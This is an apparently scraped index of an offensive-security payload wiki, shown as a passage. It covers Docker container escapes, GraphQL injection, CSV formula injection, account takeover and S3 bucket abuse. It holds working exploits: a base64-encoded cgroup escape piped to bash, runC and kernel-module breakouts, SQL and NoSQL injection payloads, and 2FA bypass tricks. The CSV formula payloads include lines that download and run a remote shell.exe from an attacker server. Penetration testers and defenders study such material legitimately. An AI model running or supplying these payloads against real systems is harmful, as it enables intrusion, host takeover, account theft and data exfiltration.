\u0026#34;cm5kX2Rpcj0kKGRhdGUgKyVzIHwgbWQ1c3VtIHwgaGVhZCAtYyAxMCkKbWtkaXIgL3RtcC9jZ3JwICYmIG1vdW50IC10IGNncm91cCAtbyByZG1hIGNncm91cCAvdG1wL2NncnAgJiYgbWtkaXIgL3RtcC9jZ3JwLyR7cm5kX2Rpcn0KZWNobyAxID4gL3RtcC9jZ3JwLyR7cm5kX2Rpcn0vbm90aWZ5X29uX3JlbGVhc2UKaG9zdF9wYXRoPWBzZWQgLW4gJ3MvLipccGVyZGlyPVwoW14sXSpcKS4qL1wxL3AnIC9ldGMvbXRhYmAKZWNobyAiJGhvc3RfcGF0aC9jbWQiID4gL3RtcC9jZ3JwL3JlbGVhc2VfYWdlbnQKY2F0ID4gL2NtZCA8PCBfRU5ECiMhL2Jpbi9zaApjYXQgPiAvcnVubWUuc2ggPDwgRU9GCnNsZWVwIDMwIApFT0YKc2ggL3J1bm1lLnNoICYKc2xlZXAgNQppZmNvbmZpZyBldGgwID4gIiR7aG9zdF9wYXRofS9vdXRwdXQiCmhvc3RuYW1lID4+ICIke2hvc3RfcGF0aH0vb3V0cHV0IgppZCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKcHMgYXh1IHwgZ3JlcCBydW5tZS5zaCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKX0VORAoKIyMgTm93IHdlIHRyaWNrIHRoZSBkb2NrZXIgZGFlbW9uIHRvIGV4ZWN1dGUgdGhlIHNjcmlwdC4KY2htb2QgYSt4IC9jbWQKc2ggLWMgImVjaG8gXCRcJCA+IC90bXAvY2dycC8ke3JuZF9kaXJ9L2Nncm91cC5wcm9jcyIKIyMgV2FpaWlpaXQgZm9yIGl0Li4uCnNsZWVwIDYKY2F0IC9vdXRwdXQKZWNobyAi4oCiPygowq/CsMK3Ll8u4oCiIHByb2ZpdCEg4oCiLl8uwrfCsMKvKSnYn+KAoiIK\u0026#34; | base64 -d | bash -\u0026#39; Exploit breakdown :\n# On the host docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash # In the container mkdir /tmp/cgrp \u0026amp;\u0026amp; mount -t cgroup -o rdma cgroup /tmp/cgrp \u0026amp;\u0026amp; mkdir /tmp/cgrp/x echo 1 \u0026gt; /tmp/cgrp/x/notify_on_release host_path=`sed -n \u0026#39;s/.*\\perdir=\\([^,]*\\).*/\\1/p\u0026#39; /etc/mtab` echo \u0026#34;$host_path/cmd\u0026#34; \u0026gt; /tmp/cgrp/release_agent echo \u0026#39;#!/bin/sh\u0026#39; \u0026gt; /cmd echo \u0026#34;ps aux \u0026gt; $host_path/output\u0026#34; \u0026gt;\u0026gt; /cmd chmod a+x /cmd sh -c \u0026#34;echo \\$\\$ \u0026gt; /tmp/cgrp/x/cgroup.procs\u0026#34; Abusing coredumps and core_pattern # Find the mounting point using mount $ mount | head -n 1 overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/YLH6C6EQMMG7DA2AL5DUANDHYJ:/var/lib/docker/overlay2/l/HP7XLDFT4ERSCYVHJ2WMZBG2YT,upperdir=/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/diff,workdir=/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/work) Create an evil binary at the root of the filesystem: cp /tmp/poc /poc Set the program to be executed on the coredumps echo \u0026#34;|/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/diff/poc\u0026#34; \u0026gt; /proc/sys/kernel/core_pattern Generate a coredump with a faulty program: gcc -o crash crash.c \u0026amp;\u0026amp; ./crash int main(void) { char buf[1]; for (int i = 0; i \u0026lt; 100; i++) { buf[i] = 1; } return 0; } Your payload should have been executed on the host Breaking out of Docker via runC # The vulnerability allows a malicious container to (with minimal user interaction) overwrite the host runc binary and thus gain root-level code execution on the host. The level of user interaction is being able to run any command \u0026hellip; as root within a container in either of these contexts: Creating a new container using an attacker-controlled image. Attaching (docker exec) into an existing container which the attacker had previous write access to. - Vulnerability overview by the runC team\nExploit for CVE-2019-5736 : https://github.com/twistlock/RunC-CVE-2019-5736\n$ docker build -t cve-2019-5736:malicious_image_POC ./RunC-CVE-2019-5736/malicious_image_POC $ docker run --rm cve-2019-5736:malicious_image_POC Breaking out of containers using a device file # https://github.com/FSecureLABS/fdpasser In container, as root: ./fdpasser recv /moo /etc/shadow Outside container, as UID 1000: ./fdpasser send /proc/$(pgrep -f \u0026#34;sleep 1337\u0026#34;)/root/moo Outside container: ls -la /etc/shadow Output: -rwsrwsrwx 1 root shadow 1209 Oct 10 2019 /etc/shadow Breaking out of Docker via kernel modules loading # When privileged Linux containers attempt to load kernel modules, the modules are loaded into the host\u0026rsquo;s kernel (because there is only one kernel, unlike VMs). This provides a route to an easy container escape.\nExploitation:\nClone the repository : git clone https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.8_privileged_container_escaping Build with make Start a privileged docker container with docker run -it --privileged --hostname docker --mount \u0026quot;type=bind,src=$PWD,dst=/root\u0026quot; ubuntu cd /root in the new container Insert the kernel module with ./escape Run ./execute! Unlike other techniques, this module doesn\u0026rsquo;t contain any syscalls hooks, but merely creates two new proc files; /proc/escape and /proc/output.\n/proc/escape only answers to write requests and simply executes anything that\u0026rsquo;s passed to it via call_usermodehelper(). /proc/output just takes input and stores it in a buffer when written to, then returns that buffer when it\u0026rsquo;s read from - essentially acting a like a file that both the container and the host can read/write to. The clever part is that anything we write to /proc/escape gets sandwiched into /bin/sh -c \u0026lt;INPUT\u0026gt; \u0026gt; /proc/output. This means that the command is run under /bin/sh and the output is redirected to /proc/output, which we can then read from within the container.\nOnce the module is loaded, you can simply echo \u0026quot;cat /etc/passwd\u0026quot; \u0026gt; /proc/escape and then get the result via cat /proc/output. Alternatively, you can use the execute program to give yourself a makeshift shell (albeit an extraordinarily basic one).\nThe only caveat is that we cannot be sure that the container has kmod installed (which provides insmod and rmmod). To overcome this, after building the kernel module, we load it\u0026rsquo;s byte array into a C program, which then uses the init_module() syscall to load the module into the kernel without needing insmod. If you\u0026rsquo;re interested, take a look at the Makefile.\nReferences # Hacking Docker Remotely - 17 March 2020 - ch0ks Understanding Docker container escapes - JULY 19, 2019 - Trail of Bits Capturing all the flags in BSidesSF CTF by pwning our infrastructure - Hackernoon Breaking out of Docker via runC – Explaining CVE-2019-5736 - Yuval Avrahami - February 21, 2019 CVE-2019-5736: Escape from Docker and Kubernetes containers to root on host - dragonsector.pl OWASP - Docker Security CheatSheet Anatomy of a hack: Docker Registry - NotSoSecure - April 6, 2017 Linux Kernel Hacking 3.8: Privileged Container Escapes - Harvey Phillips @xcellerator Escaping privileged containers for fun - 2022-03-06 :: Jordy Zomer "},{"id":32,"href":"/docs/miscellaneous_tricks/","title":"Miscellaneous Tips and Tricks","section":"Docs","content":" Miscellaneous \u0026amp; Tricks # All the tricks that couldn\u0026rsquo;t be classified somewhere else.\nSend a message to another user # # Windows PS C:\\\u0026gt; msg Swissky /SERVER:CRASHLAB \u0026#34;Stop rebooting the XXXX service !\u0026#34; PS C:\\\u0026gt; msg * /V /W /SERVER:CRASHLAB \u0026#34;Hello all !\u0026#34; # Linux $ wall \u0026#34;Stop messing with the XXX service !\u0026#34; $ wall -n \u0026#34;System will go down for 2 hours maintenance at 13:00 PM\u0026#34; # \u0026#34;-n\u0026#34; only for root $ who $ write root pts/2\t# press Ctrl+D after typing the message. CrackMapExec Credential Database # cmedb (default) \u0026gt; workspace create test cmedb (test) \u0026gt; workspace default cmedb (test) \u0026gt; proto smb cmedb (test)(smb) \u0026gt; creds cmedb (test)(smb) \u0026gt; export creds csv /tmp/creds Local Windows Enumeration # netstat # -a # all active and listening connections -b # find the binaries involved in the connections -n # don\u0026rsquo;t resolve IPs to hostnames -o # display the process ID involved in the connections C:\\\u0026gt;netstat -abno Active Connections Proto Local Address Foreign Address State PID TCP 0.0.0.0:22 0.0.0.0:0 LISTENING 2016 [sshd.exe] TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 924 RpcSs [svchost.exe] TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 Can not obtain ownership information TCP 0.0.0.0:3389 0.0.0.0:0 LISTENING 416 TermService [svchost.exe] [...] TCP 10.20.30.130:22 10.20.30.1:39956 ESTABLISHED 2016 [sshd.exe] TCP 10.20.30.130:22 10.20.30.1:39964 ESTABLISHED 2016 [sshd.exe] "},{"id":33,"href":"/docs/graphql_injection/","title":"GraphQL Injection","section":"Docs","content":" GraphQL injection # GraphQL is a query language for APIs and a runtime for fulfilling those queries with existing data. A GraphQL service is created by defining types and fields on those types, then providing functions for each field on each type\nTools # GraphQLmap - Scripting engine to interact with a graphql endpoint for pentesting purposes GraphQL-voyager - Represent any GraphQL API as an interactive graph GraphQL Security Toolkit - GraphQL Security Research Material Graphql-path-enum - Lists the different ways of reaching a given type in a GraphQL schema GraphQL IDE - An extensive IDE for exploring GraphQL API\u0026rsquo;s ClairvoyanceX - Obtain GraphQL API schema despite disabled introspection InQL - A Burp Extension for GraphQL Security Testing Insomnia - Cross-platform HTTP and GraphQL Client AutoGraphql + introspection CrackQL - A GraphQL password brute-force and fuzzing utility. Exploit # Identify an injection point # Most of the time the graphql is located on the /graphql or /graphiql endpoint.\nexample.com/graphql?query={__schema{types{name}}} example.com/graphiql?query={__schema{types{name}}} Check if errors are visible.\n?query={__schema} ?query={} ?query={thisdefinitelydoesnotexist} Enumerate Database Schema via Introspection # URL encoded query to dump the database schema.\nfragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}} URL decoded query to dump the database schema.\nfragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } } query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } Single line query to dump the database schema without fragments.\n__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}} List path # $ git clone https://gitlab.com/dee-see/graphql-path-enum $ graphql-path-enum -i ./test_data/h1_introspection.json -t Skill Found 27 ways to reach the \u0026#34;Skill\u0026#34; node from the \u0026#34;Query\u0026#34; node: - Query (assignable_teams) -\u0026gt; Team (audit_log_items) -\u0026gt; AuditLogItem (source_user) -\u0026gt; User (pentester_profile) -\u0026gt; PentesterProfile (skills) -\u0026gt; Skill - Query (checklist_check) -\u0026gt; ChecklistCheck (checklist) -\u0026gt; Checklist (team) -\u0026gt; Team (audit_log_items) -\u0026gt; AuditLogItem (source_user) -\u0026gt; User (pentester_profile) -\u0026gt; PentesterProfile (skills) -\u0026gt; Skill - Query (checklist_check_response) -\u0026gt; ChecklistCheckResponse (checklist_check) -\u0026gt; ChecklistCheck (checklist) -\u0026gt; Checklist (team) -\u0026gt; Team (audit_log_items) -\u0026gt; AuditLogItem (source_user) -\u0026gt; User (pentester_profile) -\u0026gt; PentesterProfile (skills) -\u0026gt; Skill - Query (checklist_checks) -\u0026gt; ChecklistCheck (checklist) -\u0026gt; Checklist (team) -\u0026gt; Team (audit_log_items) -\u0026gt; AuditLogItem (source_user) -\u0026gt; User (pentester_profile) -\u0026gt; PentesterProfile (skills) -\u0026gt; Skill - Query (clusters) -\u0026gt; Cluster (weaknesses) -\u0026gt; Weakness (critical_reports) -\u0026gt; TeamMemberGroupConnection (edges) -\u0026gt; TeamMemberGroupEdge (node) -\u0026gt; TeamMemberGroup (team_members) -\u0026gt; TeamMember (team) -\u0026gt; Team (audit_log_items) -\u0026gt; AuditLogItem (source_user) -\u0026gt; User (pentester_profile) -\u0026gt; PentesterProfile (skills) -\u0026gt; Skill - Query (embedded_submission_form) -\u0026gt; EmbeddedSubmissionForm (team) -\u0026gt; Team (audit_log_items) -\u0026gt; AuditLogItem (source_user) -\u0026gt; User (pentester_profile) -\u0026gt; PentesterProfile (skills) -\u0026gt; Skill - Query (external_program) -\u0026gt; ExternalProgram (team) -\u0026gt; Team (audit_log_items) -\u0026gt; AuditLogItem (source_user) -\u0026gt; User (pentester_profile) -\u0026gt; PentesterProfile (skills) -\u0026gt; Skill - Query (external_programs) -\u0026gt; ExternalProgram (team) -\u0026gt; Team (audit_log_items) -\u0026gt; AuditLogItem (source_user) -\u0026gt; User (pentester_profile) -\u0026gt; PentesterProfile (skills) -\u0026gt; Skill - Query (job_listing) -\u0026gt; JobListing (team) -\u0026gt; Team (audit_log_items) -\u0026gt; AuditLogItem (source_user) -\u0026gt; User (pentester_profile) -\u0026gt; PentesterProfile (skills) -\u0026gt; Skill - Query (job_listings) -\u0026gt; JobListing (team) -\u0026gt; Team (audit_log_items) -\u0026gt; AuditLogItem (source_user) -\u0026gt; User (pentester_profile) -\u0026gt; PentesterProfile (skills) -\u0026gt; Skill - Query (me) -\u0026gt; User (pentester_profile) -\u0026gt; PentesterProfile (skills) -\u0026gt; Skill - Query (pentest) -\u0026gt; Pentest (lead_pentester) -\u0026gt; Pentester (user) -\u0026gt; User (pentester_profile) -\u0026gt; PentesterProfile (skills) -\u0026gt; Skill - Query (pentests) -\u0026gt; Pentest (lead_pentester) -\u0026gt; Pentester (user) -\u0026gt; User (pentester_profile) -\u0026gt; PentesterProfile (skills) -\u0026gt; Skill - Query (query) -\u0026gt; Query (assignable_teams) -\u0026gt; Team (audit_log_items) -\u0026gt; AuditLogItem (source_user) -\u0026gt; User (pentester_profile) -\u0026gt; PentesterProfile (skills) -\u0026gt; Skill - Query (query) -\u0026gt; Query (skills) -\u0026gt; Skill Extract data # example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2}} Extract data using edges/nodes # { \u0026#34;query\u0026#34;: \u0026#34;query { teams{ total_count,edges{ node{ id,_id,about,handle,state } } } }\u0026#34; } Extract data using projections # :warning: Don’t forget to escape the \u0026quot; inside the options.\n{doctors(options: \u0026#34;{\\\u0026#34;patients.ssn\\\u0026#34; :1}\u0026#34;){firstName lastName id patients{ssn}}} Enumerate the types\u0026rsquo; definition # Enumerate the definition of interesting types using the following GraphQL query, replacing \u0026ldquo;User\u0026rdquo; with the chosen type\n{__type (name: \u0026#34;User\u0026#34;) {name fields{name type{name kind ofType{name kind}}}}} Use mutations # Mutations work like function, you can use them to interact with the GraphQL.\n# mutation{signIn(login:\u0026#34;Admin\u0026#34;, password:\u0026#34;secretp@ssw0rd\u0026#34;){token}} # mutation{addUser(id:\u0026#34;1\u0026#34;, name:\u0026#34;Dan Abramov\u0026#34;, email:\u0026#34;dan@dan.com\u0026#34;) {id name email}} NOSQL injection # Use $regex, $ne from inside a search parameter.\n{ doctors( options: \u0026#34;{\\\u0026#34;limit\\\u0026#34;: 1, \\\u0026#34;patients.ssn\\\u0026#34; :1}\u0026#34;, search: \u0026#34;{ \\\u0026#34;patients.ssn\\\u0026#34;: { \\\u0026#34;$regex\\\u0026#34;: \\\u0026#34;.*\\\u0026#34;}, \\\u0026#34;lastName\\\u0026#34;:\\\u0026#34;Admin\\\u0026#34; }\u0026#34;) { firstName lastName id patients{ssn} } } SQL injection # Send a single quote ' inside a graphql parameter to trigger the SQL injection\n{ bacon(id: \u0026#34;1\u0026#39;\u0026#34;) { id, type, price } } Simple SQL injection inside a graphql field.\ncurl -X POST http://localhost:8080/graphql\\?embedded_submission_form_uuid\\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\\(30\\)%3B--%27 GraphQL Batching Attacks # Common scenario:\nPassword Brute-force Amplification Scenario 2FA bypassing mutation finishChannelVerificationMutation( $input FinishChannelVerificationInput!, $input2 FinishChannelVerificationInput!, $input3 FinishChannelVerificationInput!, ){ first: finishChannelVerificationMutation(input: $input){ channel{ id option{ ... onChannelSmsOptions{ number } } status notificationSubscription(last: 1000){ etc... } } } second: finishChannelVerificationMutation(input: $input2){...} third: finishChannelVerificationMutation(input: $input3){...} } References # Introduction to GraphQL GraphQL Introspection API Hacking GraphQL - @ghostlulz - jun 8, 2019 GraphQL abuse: Bypass account level permissions through parameter smuggling - March 14, 2018 - @Detectify Discovering GraphQL endpoints and SQLi vulnerabilities - Sep 23, 2018 - Matías Choren Securing Your GraphQL API from Malicious Queries - Feb 21, 2018 - Max Stoiber GraphQL NoSQL Injection Through JSON Types - June 12, 2017 - Pete Corey SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter - Nov 6th 2018 - @jobert Looting GraphQL Endpoints for Fun and Profit - @theRaz0r How to set up a GraphQL Server using Node.js, Express \u0026amp; MongoDB - 5 NOVEMBER 2018 - Leonardo Maldonado GraphQL cheatsheet - DEVHINTS.IO HIP19 Writeup - Meet Your Doctor 1,2,3 - June 22, 2019 - Swissky Introspection query leaks sensitive graphql system information - @Zuriel Graphql Bug to Steal Anyone’s Address - Sept 1, 2019 - Pratik Yadav GraphQL Batching Attack - RENATAWALLARM - DECEMBER 13, 2019 "},{"id":34,"href":"/docs/csv_injection/","title":"Csv Injection","section":"Docs","content":" CSV Injection (Formula Injection) # Many web applications allow the user to download content such as templates for invoices or user settings to a CSV file. Many users choose to open the CSV file in either Excel, Libre Office or Open Office. When a web application does not properly validate the contents of the CSV file, it could lead to contents of a cell or many cells being executed.\nExploit # Basic exploit with Dynamic Data Exchange\n# pop a calc DDE (\u0026#34;cmd\u0026#34;;\u0026#34;/C calc\u0026#34;;\u0026#34;!A0\u0026#34;)A0 @SUM(1+1)*cmd|\u0026#39; /C calc\u0026#39;!A0 =2+5+cmd|\u0026#39; /C calc\u0026#39;!A0 # pop a notepad =cmd|\u0026#39; /C notepad\u0026#39;!\u0026#39;A1\u0026#39; # powershell download and execute =cmd|\u0026#39;/C powershell IEX(wget attacker_server/shell.exe)\u0026#39;!A0 # msf smb delivery with rundll32 =cmd|\u0026#39;/c rundll32.exe \\\\10.0.0.1\\3\\2\\1.dll,0\u0026#39;!_xlbgnm.A1 # Prefix obfuscation and command chaining =AAAA+BBBB-CCCC\u0026amp;\u0026#34;Hello\u0026#34;/12345\u0026amp;cmd|\u0026#39;/c calc.exe\u0026#39;!A =cmd|\u0026#39;/c calc.exe\u0026#39;!A*cmd|\u0026#39;/c calc.exe\u0026#39;!A +thespanishinquisition(cmd|\u0026#39;/c calc.exe\u0026#39;!A = cmd|\u0026#39;/c calc.exe\u0026#39;!A # Using rundll32 instead of cmd =rundll32|\u0026#39;URL.dll,OpenURL calc.exe\u0026#39;!A =rundll321234567890abcdefghijklmnopqrstuvwxyz|\u0026#39;URL.dll,OpenURL calc.exe\u0026#39;!A # Using null characters to bypass dictionary filters. Since they are not spaces, they are ignored when executed. = C m D | \u0026#39;/ c c al c . e x e \u0026#39; ! A Technical Details of the above payload:\ncmd is the name the server can respond to whenever a client is trying to access the server /C calc is the file name which in our case is the calc(i.e the calc.exe) !A0 is the item name that specifies unit of data that a server can respond when the client is requesting the data Any formula can be started with\n= + – @ References # OWASP - CSV Excel Macro Injection Google Bug Hunter University - CSV Excel formula injection CSV INJECTION: BASIC TO EXPLOIT!!!! - 30/11/2017 - Akansha Kesharwani From CSV to Meterpreter - 5th November 2015 - Adam Chester The Absurdly Underestimated Dangers of CSV Injection - 7 October, 2017 - George Mauer Three New DDE Obfuscation Methods Your Excel Sheets Are Not Safe! Here\u0026rsquo;s How to Beat CSV Injection "},{"id":35,"href":"/docs/checking_for_account_takeover/","title":"Account Takeovers","section":"Docs","content":" Account Takeover # Password Reset Feature # Password Reset Token Leak Via Referrer # Request password reset to your email address Click on the password reset link Don\u0026rsquo;t change password Click any 3rd party websites(eg: Facebook, twitter) Intercept the request in Burp Suite proxy Check if the referer header is leaking password reset token. Account Takeover Through Password Reset Poisoning # Intercept the password reset request in Burp Suite Add or edit the following headers in Burp Suite : Host: attacker.com, X-Forwarded-Host: attacker.com Forward the request with the modified header POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com Look for a password reset URL based on the host header like : https://attacker.com/reset-password.php?token=TOKEN Password Reset Via Email Parameter # # parameter pollution email=victim@mail.com\u0026amp;email=hacker@mail.com # array of emails {\u0026#34;email\u0026#34;:[\u0026#34;victim@mail.com\u0026#34;,\u0026#34;hacker@mail.com\u0026#34;]} # carbon copy email=victim@mail.com%0A%0Dcc:hacker@mail.com email=victim@mail.com%0A%0Dbcc:hacker@mail.com # separator email=victim@mail.com,hacker@mail.com email=victim@mail.com%20hacker@mail.com email=victim@mail.com|hacker@mail.com IDOR on API Parameters # Attacker have to login with their account and go to the Change password feature. Start the Burp Suite and Intercept the request Send it to the repeater tab and edit the parameters : User ID/email POST /api/changepass [...] (\u0026#34;form\u0026#34;: {\u0026#34;email\u0026#34;:\u0026#34;victim@email.com\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;securepwd\u0026#34;}) Weak Password Reset Token # The password reset token should be randomly generated and unique every time. Try to determine if the token expire or if it\u0026rsquo;s always the same, in some cases the generation algorithm is weak and can be guessed. The following variables might be used by the algorithm.\nTimestamp UserID Email of User Firstname and Lastname Date of Birth Cryptography Number only Small token sequence (\u0026lt;6 characters between [A-Z,a-z,0-9]) Token reuse Token expiration date Leaking Password Reset Token # Trigger a password reset request using the API/UI for a specific email e.g: test@mail.com Inspect the server response and check for resetToken Then use the token in an URL like https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]\u0026amp;email=[THE_MAIL] Password Reset Via Username Collision # Register on the system with a username identical to the victim\u0026rsquo;s username, but with white spaces inserted before and/or after the username. e.g: \u0026quot;admin \u0026quot; Request a password reset with your malicious username. Use the token sent to your email and reset the victim password. Connect to the victim account with the new password. The platform CTFd was vulnerable to this attack. See: CVE-2020-7245\nAccount takeover due to unicode normalization issue # Victim account: demo@gmail.com Attacker account: demⓞ@gmail.com Account Takeover Via Cross Site Scripting # Find an XSS inside the application or a subdomain if the cookies are scoped to the parent domain : *.domain.com Leak the current sessions cookie Authenticate as the user using the cookie Account Takeover Via HTTP Request Smuggling # Refer to HTTP Request Smuggling vulnerability page.\nUse smuggler to detect the type of HTTP Request Smuggling (CL, TE, CL.TE) git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h Craft a request which will overwrite the POST / HTTP/1.1 with the following data: GET http://something.burpcollaborator.net HTTP/1.1 X: Final request could look like the following GET / HTTP/1.1 Transfer-Encoding: chunked Host: something.com User-Agent: Smuggler/v1.0 Content-Length: 83 0 GET http://something.burpcollaborator.net HTTP/1.1 X: X Hackerone reports exploiting this bug\nhttps://hackerone.com/reports/737140 https://hackerone.com/reports/771666 Account Takeover via CSRF # Create a payload for the CSRF, e.g: \u0026ldquo;HTML form with auto submit for a password change\u0026rdquo; Send the payload Account Takeover via JWT # JSON Web Token might be used to authenticate an user.\nEdit the JWT with another User ID / Email Check for weak JWT signature 2FA Bypasses # Response Manipulation # In response if \u0026quot;success\u0026quot;:false Change it to \u0026quot;success\u0026quot;:true\nStatus Code Manipulation # If Status Code is 4xx Try to change it to 200 OK and see if it bypass restrictions\n2FA Code Leakage in Response # Check the response of the 2FA Code Triggering Request to see if the code is leaked.\nJS File Analysis # Rare but some JS Files may contain info about the 2FA Code, worth giving a shot\n2FA Code Reusability # Same code can be reused\nLack of Brute-Force Protection # Possible to brute-force any length 2FA Code\nMissing 2FA Code Integrity Validation # Code for any user acc can be used to bypass the 2FA\nCSRF on 2FA Disabling # No CSRF Protection on disabling 2FA, also there is no auth confirmation\nPassword Reset Disable 2FA # 2FA gets disabled on password change/email change\nBackup Code Abuse # Bypassing 2FA by abusing the Backup code feature Use the above mentioned techniques to bypass Backup Code to remove/reset 2FA restrictions\nClickjacking on 2FA Disabling Page # Iframing the 2FA Disabling page and social engineering victim to disable the 2FA\nEnabling 2FA doesn\u0026rsquo;t expire Previously active Sessions # If the session is already hijacked and there is a session timeout vuln\nBypass 2FA with null or 000000 # Enter the code 000000 or null to bypass 2FA protection.\nBypass 2FA with array # { \u0026#34;otp\u0026#34;:[ \u0026#34;1234\u0026#34;, \u0026#34;1111\u0026#34;, \u0026#34;1337\u0026#34;, // GOOD OTP \u0026#34;2222\u0026#34;, \u0026#34;3333\u0026#34;, \u0026#34;4444\u0026#34;, \u0026#34;5555\u0026#34; ] } TODO # Broken cryptography Session hijacking OAuth misconfiguration References # 10 Password Reset Flaws - Anugrah SR $6,5k + $5k HTTP Request Smuggling mass account takeover - Slack + Zomato - Bug Bounty Reports Explained Broken Cryptography \u0026amp; Account Takeovers - Harsh Bothra - September 20, 2020 Hacking Grindr Accounts with Copy and Paste - Troy HUNT \u0026amp; Wassime BOUIMADAGHENE - 03 OCTOBER 2020 CTFd Account Takeover "},{"id":36,"href":"/docs/amazon_aws_s3_buckets/","title":"Amazon AWS S3 Buckets","section":"Docs","content":" Amazon Bucket S3 AWS # AWS Configuration # Prerequisites, at least you need awscli\nsudo apt install awscli You can get your credential here https://console.aws.amazon.com/iam/home?#/security_credential but you need an aws account, free tier account : https://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free_np/\naws configure AWSAccessKeyId=[ENTER HERE YOUR KEY] AWSSecretKey=[ENTER HERE YOUR KEY] aws configure --profile nameofprofile then you can use \u0026ndash;profile nameofprofile in the aws command.\nAlternatively you can use environment variables instead of creating a profile.\nexport AWS_ACCESS_KEY_ID=ASIAZ[...]PODP56 export AWS_SECRET_ACCESS_KEY=fPk/Gya[...]4/j5bSuhDQ export AWS_SESSION_TOKEN=FQoGZXIvYXdzE[...]8aOK4QU= Open Bucket # By default the name of Amazon Bucket are like http://s3.amazonaws.com/[bucket_name]/, you can browse open buckets if you know their names\nhttp://s3.amazonaws.com/[bucket_name]/ http://[bucket_name].s3.amazonaws.com/ http://flaws.cloud.s3.amazonaws.com/ https://buckets.grayhatwarfare.com/ Their names are also listed if the listing is enabled.\n\u0026lt;ListBucketResult xmlns=\u0026#34;http://s3.amazonaws.com/doc/2006-03-01/\u0026#34;\u0026gt; \u0026lt;Name\u0026gt;adobe-REDACTED-REDACTED-REDACTED\u0026lt;/Name\u0026gt; Alternatively you can extract the name of inside-site s3 bucket with %C0. (Trick from https://twitter.com/0xmdv/status/1065581916437585920)\nhttp://example.com/resources/id%C0 eg: http://redacted/avatar/123%C0 Basic tests # Listing files # aws s3 ls s3://targetbucket --no-sign-request --region insert-region-here aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2 You can get the region with a dig and nslookup\n$ dig flaws.cloud ;; ANSWER SECTION: flaws.cloud. 5 IN A 52.218.192.11 $ nslookup 52.218.192.11 Non-authoritative answer: 11.192.218.52.in-addr.arpa name = s3-website-us-west-2.amazonaws.com. Move a file into the bucket # aws s3 cp local.txt s3://some-bucket/remote.txt --acl authenticated-read aws s3 cp login.html s3://$bucketName --grants read=uri=http://acs.amazonaws.com/groups/global/AllUsers aws s3 mv test.txt s3://hackerone.marketing FAIL : \u0026#34;move failed: ./test.txt to s3://hackerone.marketing/test.txt A client error (AccessDenied) occurred when calling the PutObject operation: Access Denied.\u0026#34; aws s3 mv test.txt s3://hackerone.files SUCCESS : \u0026#34;move: ./test.txt to s3://hackerone.files/test.txt\u0026#34; Download every things # aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region 